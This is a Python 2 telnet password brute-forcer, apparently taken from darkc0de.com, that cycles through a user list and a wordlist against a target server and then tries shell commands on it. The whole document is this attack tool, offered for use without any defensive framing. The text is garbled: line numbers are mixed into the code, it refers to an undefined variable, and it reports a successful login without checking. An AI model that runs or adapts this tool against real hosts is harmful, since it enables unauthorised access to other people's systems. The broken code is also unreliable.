TELNET......
#!usr/bin/python
#Telnet Brute Forcer
#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com
import threading, time, random, sys, telnetlib
from copy import copy
if len(sys.argv) !=4:
    print "Usage: ./telnetbrute.py <server> <userlist> <wordlist>"
    sys.exit(1)
try:
    users = open(sys.argv[2], "r").readlines()
except(IOError):
    print "Error: Check your userlist path\n"
    sys.exit(1)
try:
20
    words = open(sys.argv[3], "r").readlines()
21
except(IOError):
22
    print "Error: Check your wordlist path\n"
23
    sys.exit(1)
24
25
print "\n\t   d3hydr8[at]gmail[dot]com TelnetBruteForcer v1.0"
26
print "\t--------------------------------------------------\n"
27
print "[+] Server:",sys.argv[1]
28
print "[+] Users Loaded:",len(users)
29
print "[+] Words Loaded:",len(words),"\n"
30
31
wordlist = copy(words)
32
33
def reloader():
34
    for word in wordlist:
35
        words.append(word)
36
37
def getword():
38
    lock = threading.Lock()
39
    lock.acquire()
40
    if len(words) != 0:
41
        value = random.sample(words,  1)
42
        words.remove(value[0])
43
44
    else:
45
        print "\nReloading Wordlist - Changing User\n"
46
        reloader()
47
        value = random.sample(words,  1)
48
        users.remove(users[0])
49
50
    lock.release()
51
    if len(users) ==1:
52
        return value[0][:-1], users[0]
53
    else:
54
        return value[0][:-1], users[0][:-1]
55
56
class Worker(threading.Thread):
57
58
    def run(self):
59
        value, user = getword()
60
        try:
61
            print "-"*12
62
            print "User:",user,"Password:",value
63
            tn = telnetlib.Telnet(sys.argv[1])
64
            tn.read_until("login: ")
65
            tn.write(user + "\n")
66
            if password:
67
                    tn.read_until("Password: ")
68
                    tn.write(value + "\n")
69
            tn.write("ls\n")
70
            tn.write("exit\n")
71
            print tn.read_all()
72
            print "\t\nLogin successful:",value, user
73
            tn.close()
74
            work.join()
75
            sys.exit(2)
76
        except:
77
            pass
78
79
for I in range(len(words)*len(users)):
80
    work = Worker()
81
    work.start()
82
    time.sleep(1)
